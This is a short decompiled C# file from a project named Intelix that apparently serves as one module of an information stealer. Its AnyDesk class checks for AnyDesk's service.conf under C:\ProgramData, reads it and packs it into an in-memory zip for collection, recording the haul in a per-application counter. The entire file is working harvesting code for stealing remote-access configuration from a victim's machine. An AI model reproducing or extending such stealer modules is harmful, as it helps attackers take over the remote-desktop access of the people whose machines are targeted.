using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200003C RID: 60
	public class AnyDesk : ITarget
	{
		// Token: 0x060000CD RID: 205 RVA: 0x0000BE48 File Offset: 0x0000A048
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\ProgramData\\AnyDesk\\service.conf";
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "AnyDesk\\service.conf";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "AnyDesk";
				counterApplications.Files.Add(text + " => " + text2);
				counter.Applications.Add(counterApplications);
				zip.AddFile(text2, File.ReadAllBytes(text));
			}
		}
	}
}
